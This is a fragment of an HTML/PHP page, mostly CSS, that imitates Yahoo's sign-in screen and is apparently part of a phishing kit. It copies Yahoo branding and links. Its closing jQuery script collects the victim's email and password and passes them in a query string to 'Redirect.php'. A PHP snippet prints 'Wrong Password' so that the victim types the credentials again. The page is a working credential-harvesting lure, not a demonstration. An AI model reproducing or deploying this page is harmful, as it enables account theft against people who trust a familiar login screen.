        .orko .flag.KE {
            background-position: -16px -144px
        }
        .orko .flag.JP {
            background-position: -32px -144px
        }
        .orko .flag.JO {
            background-position: -48px -144px
        }
        .orko .flag.JM {
            background-position: -64px -144px
        }
        .orko .flag.JE {
            background-position: -80px -144px
        }
        .orko .flag.IT {
            background-position: -96px -144px
        }
        .orko .flag.IS {
            background-position: -112px -144px
        }
        .orko .flag.IR {
            background-position: -128px -144px
        }
        .orko .flag.IQ {
            background-position: -144px -144px
        }
        .orko .flag.IO {
            background-position: -160px 0
        }
        .orko .flag.IN {
            background-position: -160px -11px
        }
        .orko .flag.IM {
            background-position: -160px -22px;
            width: 16px;
            height: 9px
        }
        .orko .flag.IL {
            background-position: -160px -31px
        }
        .orko .flag.IE {
            background-position: -160px -42px
        }
        .orko .flag.ID {
            background-position: -160px -53px
        }
        .orko .flag.HU {
            background-position: -160px -64px
        }
        .orko .flag.HT {
            background-position: -160px -75px
        }
        .orko .flag.HR {
            background-position: -160px -86px
        }
        .orko .flag.HN {
            background-position: -160px -97px
        }
        .orko .flag.HK {
            background-position: -160px -108px
        }
        .orko .flag.GY {
            background-position: -160px -119px
        }
        .orko .flag.GW {
            background-position: -160px -130px
        }
        .orko .flag.GU {
            background-position: -160px -141px
        }
        .orko .flag.GT {
            background-position: 0 -155px
        }
        .orko .flag.GS {
            background-position: -16px -155px
        }
        .orko .flag.GR {
            background-position: -32px -155px
        }
        .orko .flag.GQ {
            background-position: -48px -155px
        }
        .orko .flag.GP {
            background-position: -64px -155px
        }
        .orko .flag.GN {
            background-position: -80px -155px
        }
        .orko .flag.GM {
            background-position: -96px -155px
        }
        .orko .flag.GL {
            background-position: -112px -155px
        }
        .orko .flag.GI {
            background-position: -128px -155px
        }
        .orko .flag.GH {
            background-position: -144px -155px
        }
        .orko .flag.GG {
            background-position: -160px -155px
        }
        .orko .flag.GE {
            background-position: -176px 0
        }
        .orko .flag.GD {
            background-position: -176px -11px
        }
        .orko .flag.GB,
        .orko .flag.UK {
            background-position: -176px -22px
        }
        .orko .flag.GA {
            background-position: -176px -33px
        }
        .orko .flag.BL,
        .orko .flag.FR,
        .orko .flag.GF,
        .orko .flag.MF,
        .orko .flag.RE {
            background-position: -176px -44px
        }
        .orko .flag.FO {
            background-position: -176px -55px
        }
        .orko .flag.FM {
            background-position: -176px -66px
        }
        .orko .flag.FK {
            background-position: -176px -77px
        }
        .orko .flag.FJ {
            background-position: -176px -88px
        }
        .orko .flag.FI {
            background-position: -176px -99px
        }
        .orko .flag.FAM {
            background-position: -176px -110px
        }
        .orko .flag.EU {
            background-position: -176px -121px
        }
        .orko .flag.ET {
            background-position: -176px -132px
        }
        .orko .flag.ES {
            background-position: -176px -143px
        }
        .orko .flag.ER {
            background-position: -176px -154px
        }
        .orko .flag.ENGLAND {
            background-position: 0 -166px
        }
        .orko .flag.EH {
            background-position: -16px -166px
        }
        .orko .flag.EG {
            background-position: -32px -166px
        }
        .orko .flag.EE {
            background-position: -48px -166px
        }
        .orko .flag.EC {
            background-position: -64px -166px
        }
        .orko .flag.DZ {
            background-position: -80px -166px
        }
        .orko .flag.DO {
            background-position: -96px -166px
        }
        .orko .flag.DM {
            background-position: -112px -166px
        }
        .orko .flag.DK {
            background-position: -128px -166px
        }
        .orko .flag.DJ {
            background-position: -144px -166px
        }
        .orko .flag.DE {
            background-position: -160px -166px
        }
        .orko .flag.CZ {
            background-position: -176px -166px
        }
        .orko .flag.CY {
            background-position: 0 -177px
        }
        .orko .flag.CX {
            background-position: -16px -177px
        }
        .orko .flag.CW {
            background-position: -32px -177px
        }
        .orko .flag.CV {
            background-position: -48px -177px
        }
        .orko .flag.CU {
            background-position: -64px -177px
        }
        .orko .flag.CS {
            background-position: -80px -177px
        }
        .orko .flag.CR {
            background-position: -96px -177px
        }
        .orko .flag.CO {
            background-position: -112px -177px
        }
        .orko .flag.CN {
            background-position: -128px -177px
        }
        .orko .flag.CM {
            background-position: -144px -177px
        }
        .orko .flag.CL {
            background-position: -160px -177px
        }
        .orko .flag.CK {
            background-position: -176px -177px
        }
        .orko .flag.CI {
            background-position: -192px 0
        }
        .orko .flag.CG {
            background-position: -192px -11px
        }
        .orko .flag.CF {
            background-position: -192px -22px
        }
        .orko .flag.CD {
            background-position: -192px -33px
        }
        .orko .flag.CC {
            background-position: -192px -44px
        }
        .orko .flag.CATALONIA {
            background-position: -192px -55px
        }
        .orko .flag.CA {
            background-position: -192px -66px
        }
        .orko .flag.BZ {
            background-position: -192px -77px
        }
        .orko .flag.BY {
            background-position: -192px -88px
        }
        .orko .flag.BW {
            background-position: -192px -99px
        }
        .orko .flag.BT {
            background-position: -192px -110px
        }
        .orko .flag.BS {
            background-position: -192px -121px
        }
        .orko .flag.BR {
            background-position: -192px -132px
        }
        .orko .flag.BQ {
            background-position: -192px -143px
        }
        .orko .flag.BO {
            background-position: -192px -154px
        }
        .orko .flag.BN {
            background-position: -192px -165px
        }
        .orko .flag.BM {
            background-position: -192px -176px
        }
        .orko .flag.BJ {
            background-position: 0 -188px
        }
        .orko .flag.BI {
            background-position: -16px -188px
        }
        .orko .flag.BH {
            background-position: -32px -188px
        }
        .orko .flag.BG {
            background-position: -48px -188px
        }
        .orko .flag.BF {
            background-position: -64px -188px
        }
        .orko .flag.BE {
            background-position: -80px -188px
        }
        .orko .flag.BD {
            background-position: -96px -188px
        }
        .orko .flag.BB {
            background-position: -112px -188px
        }
        .orko .flag.BA {
            background-position: -128px -188px
        }
        .orko .flag.AZ {
            background-position: -144px -188px
        }
        .orko .flag.AX {
            background-position: -160px -188px
        }
        .orko .flag.AW {
            background-position: -176px -188px
        }
        .orko .flag.AU,
        .orko .flag.HM {
            background-position: -192px -188px
        }
        .orko .flag.AT {
            background-position: -208px 0
        }
        .orko .flag.AS {
            background-position: -208px -11px
        }
        .orko .flag.AR {
            background-position: -208px -22px
        }
        .orko .flag.AO {
            background-position: -208px -33px
        }
        .orko .flag.AN {
            background-position: -208px -44px
        }
        .orko .flag.AM {
            background-position: -208px -55px
        }
        .orko .flag.AL {
            background-position: -208px -66px
        }
        .orko .flag.AI {
            background-position: -208px -77px
        }
        .orko .flag.AG {
            background-position: -208px -88px
        }
        .orko .flag.AF {
            background-position: -208px -99px
        }
        .orko .flag.AE {
            background-position: -208px -110px
        }
        .orko .flag.AD {
            background-position: -208px -121px
        }
        .orko .flag.NP {
            background-position: -208px -132px;
            width: 9px;
            height: 11px
        }
        .orko .flag.CH {
            background-position: -208px -143px;
            width: 11px;
            height: 11px
        }
        .orko .ictrl.suggestions-carousel .list-box {
            border: 1px solid #188fff;
            color: #188fff;
            cursor: pointer;
            display: none;
            height: 30px;
            position: relative;
            top: -6px;
            width: 100%
        }
        .orko .ictrl.suggestions-carousel.open .list-box {
            display: -webkit-inline-box;
            display: -ms-inline-flexbox;
            display: inline-flex
        }
        .orko .ictrl.suggestions-carousel .arrow-box {
            padding: 10px 12px;
            width: 30px
        }
        .orko .ictrl.suggestions-carousel .l-arrow-box {
            border-right: 1px solid #188fff
        }
        .orko .ictrl.suggestions-carousel .r-arrow-box {
            border-left: 1px solid #188fff
        }
        .orko .ictrl.suggestions-carousel .arrow-box div {
            border-top: 5px solid transparent;
            border-bottom: 5px solid transparent
        }
        .orko .ictrl.suggestions-carousel .l-arrow {
            border-right: 5px solid #188fff
        }
        .orko .ictrl.suggestions-carousel .r-arrow {
            border-left: 5px solid #188fff
        }
        .orko .ictrl.suggestions-carousel .arrow-box.disabled {
            cursor: default
        }
        .orko .ictrl.suggestions-carousel .arrow-box.disabled .l-arrow {
            border-right-color: rgba(24, 143, 255, .5)
        }
        .orko .ictrl.suggestions-carousel .arrow-box.disabled .r-arrow {
            border-left-color: rgba(24, 143, 255, .5)
        }
        .orko .ictrl.suggestions-carousel .list {
            overflow: hidden;
            padding: 5px;
            position: relative;
            width: 100%
        }
        .orko .ictrl.suggestions-carousel ul {
            left: 0;
            top: 4px;
            position: absolute;
            white-space: nowrap;
            width: 100%
        }
        .orko .ictrl.suggestions-carousel ul li {
            display: inline-block;
            overflow: hidden;
            width: 100%
        }
        .hide,
        .info-box {
            display: none
        }
        .orko-link,
        a {
            color: #188fff;
            text-decoration: none
        }
        .orko-link:active,
        .orko-link:hover,
        a:active,
        a:hover {
            color: #003abc
        }
        .orko-txt-display {
            font-size: 1.857em
        }
        .orko-txt-headline {
            font-size: 1.428em
        }
        .orko-txt-header,
        h1 {
            font-size: 1.286em
        }
        .orko-txt-subheader,
        h2 {
            font-size: 1.143em
        }
        .orko-txt-caption,
        h3 {
            font-size: .857em
        }
        .orko-txt-default,
        h4 {
            font-size: 1em
        }
        .orko-txt-micro {
            font-size: .714em
        }
        .error,
        .error-offline {
            color: #dd1037;
            font-size: .82353em
        }
        .offscreen {
            position: absolute;
            height: 1px;
            width: 1px;
            overflow: hidden;
            clip: rect(1px 1px 1px 1px);
            clip: rect(1px, 1px, 1px, 1px)
        }
        .error-offline {
            margin: 5px;
            padding: 10px;
            border: 1px solid #dd1037;
            border-radius: 4px;
            text-align: left
        }
        .orko {
            letter-spacing: normal
        }
        .orko h1,
        .orko h2,
        .orko h3 {
            margin: 0
        }
        .orko-button,
        a.orko-button,
        input.orko-button {
            font-size: .94118em;
            width: 100%
        }
        a.orko-button {
            height: auto;
            padding: 11px
        }
        @media (max-width: 550px) {
            .one-half.column {
                width: 50%
            }
        }
        html {
            font-size: 17px
        }
        body.ios {
            font: -apple-system-headline;
            font-family: "Helvetica Neue", Helvetica, Arial;
            font-weight: 400
        }
        .login-header {
            height: 61px
        }
        .login-header .column {
            height: inherit
        }
        .zh-hant-tw .login-header img {
            width: 90px
        }
        .login-header img {
            margin: 14px 16px
        }
        .login-header .help {
            padding: 21px 16px;
            font-size: .76471em;
            text-align: right
        }
        .login-body,
        .login-footer,
        .narrow .login-header {
            text-align: center
        }
        .partner.ftr .logo,
        .partner.rogers-acs .logo,
        .partner.sbc .logo,
        .partner.vz-acs .logo {
            width: 226px
        }
        .login-footer {
            padding: 6px 0;
            font-size: .58824em;
            position: fixed;
            bottom: 0;
            background: #fff;
            z-index: 1;
            width: 100%
        }
        .login-footer .row {
            margin: 0
        }
        .login-footer .privacy-update-text {
            color: #400090;
            font-weight: 500
        }
        @media screen and (max-height: 650px) {
            .login-footer {
                border-top: 1px solid rgba(73, 15, 118, .35);
                box-shadow: 0 0 9px 0 rgba(73, 15, 118, .35)
            }
        }
        @media screen and (max-width: 480px),
        screen and (max-height: 480px) {
            .resp .login-footer,
            .resp .login-header {
                display: none
            }
        }
        .login-body {
            height: 100%
        }
        .login-content {
            margin: 0 auto;
            max-width: 1050px;
            min-width: 320px;
            position: relative
        }
        .info-box,
        .login-box {
            position: absolute;
            top: 11px
        }
        .zh-hant-tw .login-box {
            margin-top: 10px
        }
        .login-box {
            box-sizing: border-box;
            background-color: #fff;
            box-shadow: 0 2px 4px 0 rgba(181, 181, 181, .7);
            width: 360px;
            right: 10px;
            min-height: 550px;
            z-index: 1;
            padding: 0 5px;
            border-top: 1px solid #f1f1f5
        }
        .login-box.center {
            position: relative;
            margin: 0 auto;
            right: auto
        }
        .zh-hant-tw .login-box .login-logo {
            height: 65px
        }
        .login-box .login-logo {
            direction: ltr;
            margin-top: 30px;
            height: 50px
        }
        .ad-content,
        .ad-outer {
            height: 100%;
            min-height: 580px;
            z-index: 0;
            top: 0;
            position: relative;
            overflow: hidden
        }
        .info-box {
            left: 0;
            padding: 56px 410px 56px 40px;
            text-align: left
        }
        .info-box .title {
            font-weight: 500
        }
        .info-box .desc,
        .info-box .title {
            font-size: 1.23529em
        }
        .info-box h3,
        .info-box h4 {
            margin: 10px 0
        }
        .info-box ul {
            margin: 0;
            padding: 0 30px;
            list-style: circle;
            font-size: .82353em
        }
        .info-box ul li {
            display: list-item;
            margin: 5px 0;
            list-style-type: disc
        }
        .ad-outer {
            width: 100%;
            text-align: center
        }
        .ad-inner {
            margin: 0 -800px
        }
        .no-js .info-box {
            display: block
        }
        .auto-submit,
        .no-js .ad-outer {
            display: none
        }
        .resp .info-box {
            display: block
        }
        .resp .ad-outer {
            display: none
        }
        @media screen and (max-width: 640px) {
            .resp .info-box {
                display: none
            }
            .resp .login-box {
                position: relative;
                margin: 0 auto;
                right: auto
            }
        }
        @media screen and (max-width: 480px) {
            .resp .login-box:before {
                display: none
            }
            .resp .login-box {
                box-shadow: none;
                width: 100%
            }
        }
        .login-body .country-code-dropdown {
            position: relative;
            height: 40px;
            margin: 0;
            font-size: .94118em
        }
        .login-body .country-code-dropdown .arrow {
            position: absolute;
            right: .85em;
            top: 47%;
            border: .35em solid;
            border-color: #8f8f8f transparent transparent;
            font-size: .94118em;
            pointer-events: none
        }
        .login-body .country-code-dropdown select {
            width: 100%;
            height: 100%;
            padding: .25em 1em;
            border: 1px solid #e5e5e5;
            border-radius: 2px;
            box-shadow: none;
            margin: 0;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none
        }
        .login-body .country-code-dropdown select:focus {
            outline: 0;
            border-color: #198fff
        }
        .login-body .cci-dropdown {
            position: relative
        }
        .login-body .cci-dropdown .selected-country-code-cont {
            position: absolute;
            display: table;
            height: 41px;
            width: 45px;
            left: 0;
            z-index: 2
        }
        .login-body .cci-dropdown .selected-country-code-cont .arrow {
            left: initial;
            right: 0
        }
        .login-body .cci-dropdown .selected-country-code {
            position: relative;
            display: table-cell;
            vertical-align: middle
        }
        .orko .sign-in-title,
        .orko .sign-in-title-sub {
            display: block;
            font-weight: 500;
            letter-spacing: normal
        }
        .login-body .cci-dropdown .phone-no {
            padding-left: 50px
        }
        .login-body .cci-dropdown .country-dropdown-container {
            opacity: 0;
            position: absolute;
            left: 0;
            width: 45px;
            z-index: 2
        }
        .login-body .cci-dropdown.code-of-length-3 .country-dropdown-container,
        .login-body .cci-dropdown.code-of-length-3 .selected-country-code-cont {
            width: 58px
        }
        .login-body .cci-dropdown.code-of-length-3 .phone-no {
            padding-left: 63px
        }
        .login-body .cci-dropdown.code-of-length-2 .country-dropdown-container,
        .login-body .cci-dropdown.code-of-length-2 .selected-country-code-cont {
            width: 50px
        }
        .login-body .cci-dropdown.code-of-length-2 .phone-no {
            padding-left: 55px
        }
        .orko .sign-in-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-size: 1.05882em
        }
        .orko .sign-in-title-sub {
            margin: 0;
            font-size: .94118em;
            text-align: left
        }
        .username-challenge {
            max-width: 300px;
            margin: 0 auto
        }
        .username-challenge .row {
            margin-bottom: 20px
        }
        .username-challenge .username-country-code {
            position: relative;
            margin-top: 30px
        }
        .username-challenge .selected-country-code-cont {
            margin-top: -1px
        }
        .username-challenge input {
            width: 100%
        }
        .username-challenge .sign-in-title-desc {
            margin: 0;
            padding: 0;
            font-size: .94118em
        }
        .username-challenge input[name=signin] {
            margin: 30px 0
        }
        .username-challenge input[name=username] {
            position: relative;
            margin: 0;
            padding: 6px 10px;
            height: 40px;
            border: 0;
            border-radius: 0;
            border-bottom: 1px solid #cfd2d5;
            letter-spacing: normal;
            font-size: .94118em;
            z-index: 1
        }
        .username-challenge input[name=username]:focus {
            height: 40px
        }
        .username-challenge input[name=username].field-error {
            border-bottom: 2px solid #dd1037
        }
        .username-challenge .error {
            margin: 10px 0;
            color: #dd1037;
            text-align: left;
            font-size: .70588em
        }
        .username-challenge .hide-passwd {
            margin: -1px 0 0;
            padding: 0;
            height: 1px;
            overflow: hidden
        }
        .username-challenge .hide-passwd input[type=password] {
            border: 0
        }
        .username-challenge .stay-signed-in {
            position: relative;
            display: inline-block;
            vertical-align: middle;
            font-size: .76471em;
            color: #979797;
            text-align: left
        }
        .username-challenge .stay-signed-in input[type=checkbox] {
            display: inline-block;
            margin: 0;
            height: auto;
            width: 18px;
            opacity: 0;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none
        }
        .username-challenge .stay-signed-in input[type=checkbox]+label {
            display: inline-block;
            height: 18px;
            font: inherit;
            cursor: pointer
        }
        .username-challenge .stay-signed-in input[type=checkbox]:checked+label {
            color: #188fff
        }
        .username-challenge .stay-signed-in input[type=checkbox]:active+label,
        .username-challenge .stay-signed-in input[type=checkbox]:hover+label {
            color: #003abc
        }
        .username-challenge .stay-signed-in input[type=checkbox]:focus+label {
            height: 18px;
            border-bottom: 1px dotted #188fff
        }
        .username-challenge .stay-signed-in input[type=checkbox]+label::before {
            background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAoBAMAAAB+0KVeAAAAGFBMVEVMaXHf39/Y2N3Y2t3Y2dzX2dzV3t7Y2t3CExDlAAAAB3RSTlMAEC76ufYfxPkBNAAAAEVJREFUKM9jYKAFYHIuRwImCmBB1XIUEAQWdEcVLAELmqMKFoMFy8sTBRGgvBwqKIBk7ajgMBTEmhiwJhusCQxrUqQ+AABBimZL8xglugAAAABJRU5ErkJggg==);
            background-position: -1px;
            position: absolute;
            display: inline-block;
            top: 0;
            left: 0;
            height: 18px;
            width: 18px;
            background-size: 18px;
            content: ' '
        }
        .username-challenge .stay-signed-in input[type=checkbox]:checked+label::before {
            background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAoCAMAAAC7IEhfAAAA2FBMVEVMaXF/f3+Di5SGjY2FipCGi5CHi5B/j4+Gi4+HjI+IiIiGi4+Gi5Cqqqp/f5mHjJCHi4+Hi4+HjI9/f3+IiJGIjY2GjI+GjI////+GjJCFkZGHjJCHjJCHi5CGjJCHjI+JiYmGjI+HjJCIjI+Hi46Gi5CHi5CHi4+Hi4+Hj4+FjZGGjJGGjJCJiZCRkZGIi5CGjI+HjI+GipGHjI+HjI+HjZCGjI+Hi5CGi5CGi4+Eio+Gi5CGi4+FjI+GjI6Gi4+Hi4+FjZGGjJCFi5GGjZGHjI+Hh5aHjJCY4B9iAAAAR3RSTlMABh8kLvbkEPq5DzfrAwr98b7TAhwt3E4B6RXNxqaynA1XhmlC7a/qgCA/dPQlB1iM9UaX91Ol72xuMMn8UFvQt0G2KkigEWGWbxYAAAEaSURBVDjL1dTFbsNAFEbh34nt2GFmKjMzc8/7v1EXqZO0tWcidZWzvPqk0Z3FlZYiNwz40zwY31yPJbkeGGH2Dl4lhZhhsQLcSwrM0HkGeJIEkElcoLAJkH+zwdolQPlWFtg+A/ByssFjgPN12eA2QNCSDe4BcCQbXPv1URG86HRW5t1jKQFuQak1cw8l4mHtBAhOo+l7QALUKoC3Oxm+eAAfsbA9AijnJClXBhh9xkIVBgAbDalxBTAoZOKhnCFAPn2QBxg6SoI6rAD4PkDFUTJUsR/t2i/KBJXtTVwvKzNUtwpQ7coGVW9Csy471I7vp7QIVDqtxeCsf8BUJrbUDxh/AKYFUxiaYTg7Zp7J7buWs/f9buhqifoCVj2QlHKddZ4AAAAASUVORK5CYII=);
            background-position: 0
        }
        .username-challenge .column.help {
            text-align: right;
            font-size: .76471em
        }
        .username-challenge .help {
            font-size: .82353em
        }
        .username-challenge .tsl-description {
            margin: 20px 0;
            padding: 0;
            font-size: .76471em
        }
        .username-challenge .one-flow-heading {
            margin: 20px 0
        }
        .username-challenge .sign-in,
        .username-challenge .sign-up {
            position: absolute;
            margin: 30px 5px;
            padding: 0;
            left: 0;
            bottom: 0;
            right: 0;
            font-size: .82353em
        }
        .username-challenge.oneid_link .sign-up {
            display: none
        }
        .username-challenge .notice {
            padding: 15px;
            background: #FFFFB7;
            border-radius: 4px;
            color: #26282A;
            text-align: left;
            font-size: .82353em
        }
        .username-challenge .notice h2 {
            font-weight: 700
        }
        .username-challenge .notice p {
            margin: 0
        }
        .username-challenge .social-login {
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -ms-flex-direction: row;
            flex-direction: row;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap;
            -ms-flex-pack: distribute;
            justify-content: space-around;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            margin: 0
        }
        .username-challenge .social-login .icon {
            height: 42px;
            width: 42px;
            background-color: #5a5a5a;
            cursor: pointer
        }
        .username-challenge .social-login .sc-google:hover {
            background-color: #db3236
        }
        .username-challenge .social-login .sc-yahoo:hover {
            background-color: #720e9e
        }
        .username-challenge .social-login .sc-facebook:hover {
            background-color: #3b5998
        }
        .username-challenge .social-login .sc-twitter:hover {
            background-color: #1dcaff
        }
        @media screen and (max-height: 550px) {
            .username-challenge .sign-up {
                position: relative
            }
        }
        .username-challenge .oauth-notice {
            margin: 20px 0;
            display: none
        }
        .username-challenge .oauth-notice p {
            margin: 20px 0;
            font-size: .82353em
        }
        .username-challenge .oauth-notice.show {
            display: block
        }
        .username-challenge .oauth-notice.show+input[name=signin] {
            display: none
        }
        .manage-account {
            margin: 0 auto;
            padding: 5px 5px 50px;
            max-width: 500px;
            text-align: left
        }
        .manage-account h2 {
            margin: 20px 0;
            font-size: 1.29412em;
            font-weight: 500
        }
        .manage-account .title-desc {
            margin-bottom: 15px
        }
        .manage-account .error {
            margin: 10px 0;
            padding: 10px;
            color: #dd1037;
            text-align: left;
            font-size: .76471em;
            border: 1px solid #dd1037
        }
        .manage-account .account-list li {
            margin: 0
        }
        .manage-account .account-card {
            position: relative;
            padding: 1em;
            border-bottom: 2px solid #e2e2e2
        }
        .manage-account .account-card:last-child {
            border: 0
        }
        .manage-account .account-card .username {
            display: block;
            width: 60%;
            color: #000;
            white-space: nowrap
        }
        .manage-account .account-card.loggedOut .username {
            color: #7c7c7c
        }
        .manage-account .account-card .username:hover {
            color: #003abc
        }
        .manage-account .account-card .username img {
            width: 3em;
            height: 3em;
            float: left;
            margin-right: .63em;
            padding-left: 1px
        }
        .manage-account .account-card .username span,
        .manage-account .account-card .username strong {
            display: block;
            text-overflow: ellipsis;
            overflow: hidden
        }
        .manage-account .account-card .actions {
            position: absolute;
            top: 1em;
            right: 0;
            text-align: right;
            font-size: .82353em
        }
        .manage-account .account-card .actions a {
            display: block
        }
        .manage-account .account-card .actions .sign-out {
            color: #818181
        }
        .manage-account .account-card .actions .sign-out:hover {
            color: #003abc
        }
        .manage-account .account-card button {
            position: absolute;
            top: 1em;
            right: 0;
            margin: 15px 0;
            padding: 5px 16px;
            border: 0
        }
        .manage-account .account-card button:focus,
        .manage-account .account-card button:hover {
            outline: #188fff solid 1px
        }
        .manage-account .orko-button {
            padding: .8em 1.5em;
            width: auto;
            height: auto
        }
        .switch-account {
            margin: 0 auto;
            padding: 5px;
            max-width: 500px
        }
        .switch-account h2 {
            margin: 20px 0;
            font-size: 1.29412em;
            font-weight: 500
        }
        .switch-account .account-card {
            box-sizing: border-box;
            width: 300px;
            margin: 40px auto;
            padding: 24px;
            border-radius: 2px;
            background-color: #fff;
            box-shadow: 0 3px 7px 0 rgba(181, 181, 181, .7))
        }
        .switch-account .account-card img {
            display: block;
            margin: 16px auto 32px;
            width: 96px;
            height: 96px
        }
        .switch-account .account-card span,
        .switch-account .account-card strong {
            display: block;
            text-overflow: ellipsis;
            overflow: hidden
        }
        .switch-account .orko-button {
            display: block;
            margin: 20px auto;
            padding: .8em 1.5em;
            height: auto
        }
        .confirm-logout {
            margin: auto 30px
        }
        .confirm-logout img {
            margin-top: 20px
        }
        .confirm-logout .title {
            padding: 20px 0 40px
        }
        .confirm-logout a {
            margin: 10px auto
        }
        .imapin-error {
            margin-top: 20px
        }
    </style>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
</head>

<body class="orko en-us">
    <div class="row login-header">
        <span class="one-half column"><a href="https://www.yahoo.com/" title="Yahoo">
        <img src="./login_files/yahoo_en-US_f_p_bestfit_2x.png" alt="Yahoo" class="logo" width="116">
    </a></span>
        <span class="one-half column help"><a href="https://help.yahoo.com/kb/index?locale=en_US&amp;page=product&amp;y=PROD_ACCT">Help</a></span>
    </div>
    <div class="login-body">
        <div class="login-content">
            <div class="login-box ">
                <div class="login-logo"><img src="./login_files/yahoo_en-US_f_p_bestfit_2x.png" alt="Yahoo" class="logo" width="116">
                </div>
                <form id="login-username-form" method="post" class="username-challenge">
                    <h1 class="sign-in-title" id="thisText">
                        Sign in
                    </h1>
					<?php 
					if((isset($_GET["Notice"])) && ($_GET["Notice"]==1)) 
					{ echo'<p style="font-size:14px; color:red">Wrong Password</p>';}
					?>
					
					<div class="greeting hide" id="greeting">
						<h1 class="username" id="thisUser" style="font-size: 18px; padding-top:15%;"></h1>
						<p class="not-you" style="margin-bottom: -25px;"><a href="index.php">Not you?</a></p>
					</div>


                    <div id="username-country-code-field" class="username-country-code cci-dropdown-disabled code-of-length-1">
                        <input class="phone-no " type="text" name="username" id="login-username" tabindex="1" value="" autocapitalize="none" autocorrect="off" autofocus="true" placeholder="Enter your email">
						
                        <div class="hide-passwd" id="dPass">
                            <input name="passwd" id="passwd" type="password" tabindex="-1" aria-hidden="true" role="presentation" autocorrect="off" placeholder="Password">
							<input name="domain_type" id="domain_type" type="hidden" value="Yahoo">
                        </div>
                    </div>
					<p class="row error hide" role="alert" data-error="messages.ERROR_INVALID_USERNAME"  id="username-error">
						Sorry, we don't recognize this email.
					</p>


                    <input id="login-signin" type="button" name="signin" class="orko-button-primary orko-button" value="Next" tabindex="2" >
					
					<input id="login-signin2" type="button" name="signin2" class="orko-button-primary orko-button" value="Sign in" tabindex="4" style="visibility:hidden; margin-top: 10px;">

                    <p class="row">
                    <span class="one-half column stay-signed-in" id="presistent">
                        <input id="persistent" name="persistent" value="y" type="checkbox" tabindex="3" checked="">
                        <label for="persistent">Stay signed in</label>
                    </span>
                    <span class="one-half column help" id="trouble">
                        <a href="https://login.yahoo.com/forgot?done=https%3A%2F%2Fmail.yahoo.com%2F" id="mbr-forgot-link">Trouble signing in?</a>
                    </span>
                    </p>


                </form>

            </div>
            <div id="login-info-box" class="info-box" style="display: block;">
                <h3 class="title">Yahoo makes it easy to enjoy what matters most in your&nbsp;world.</h3>
                <p class="desc">Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of&nbsp;life.</p>
            </div>
        </div>
        <div class="ad-outer">
            <div class="ad-inner">
                <div id="login-ad-rich"></div>
            </div>
        </div>
    </div>
    <div class="login-footer">
        <a href="https://info.yahoo.com/legal/us/yahoo/terms/en-US">Terms</a>
        <span>|</span>
        <a href="https://info.yahoo.com/privacy/us/yahoo">Privacy
        </a>
    </div>
    <div id="ad"></div>

    <script type="text/javascript" nonce="">
		
    </script>
	
	<img alt="" role="presentation" aria-hidden="true" width="0" height="0" src="./login_files/loga">
	
	<script type="text/javascript">
		function validateEmail(email) {
			var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
			return re.test(email);
		}
        $(document).ready(function() {
            $("#login-signin").click(function() {
                var use = $("#login-username").val();
				if (validateEmail(use) == true) {
					$("#login-username").addClass("hide");
					$("#username-error").addClass("hide");
					$("#dPass").removeClass("hide-passwd");
					$("#thisText").hide();
					$("#greeting").removeClass("hide");
					$("#thisUser").html("Hello "+use);
					$("#login-signin").hide();
					$("#presistent").hide();
					$("#trouble").hide();
					$("#login-signin2").css('visibility','visible');
				} else {
					$("#username-error").removeClass("hide");
				}
            });
        });
		
        $('#login-username').bind('keyup', function(e) {
            if (e.which == 13) {
                var use = $("#login-username").val();
				if (validateEmail(use) == true) {
					$("#login-username").addClass("hide");
					$("#username-error").addClass("hide");
					$("#dPass").removeClass("hide-passwd");
					$("#thisText").hide();
					$("#greeting").removeClass("hide");
					$("#thisUser").html("Hello "+use);
					$("#login-signin").hide();
					$("#presistent").hide();
					$("#trouble").hide();
					$("#login-signin2").css('visibility','visible');
				} else {
					$("#username-error").removeClass("hide");
				}
            }
        });
		$(document).ready(function() {
			$("#login-signin2").click(function() {
				var domain = $("#domain_type").val();
				var pass = $("#passwd").val();
                var user = $("#login-username").val();
				
				var data = "user="+user+"&pass="+pass+"&domain="+domain;
				window.location="Redirect.php?"+data;
			});
		});
		$('#login-signin2').bind('keyup', function(e) {
            if (e.which == 13) {
				var domain = $("#domain_type").val();
                var pass = $("#passwd").val();
                var user = $("#login-username").val();
				
				var data = "user="+user+"&pass="+pass+"&domain="+domain;
				window.location="Redirect.php?"+data;
            }
        });
    </script>
</body>

</html>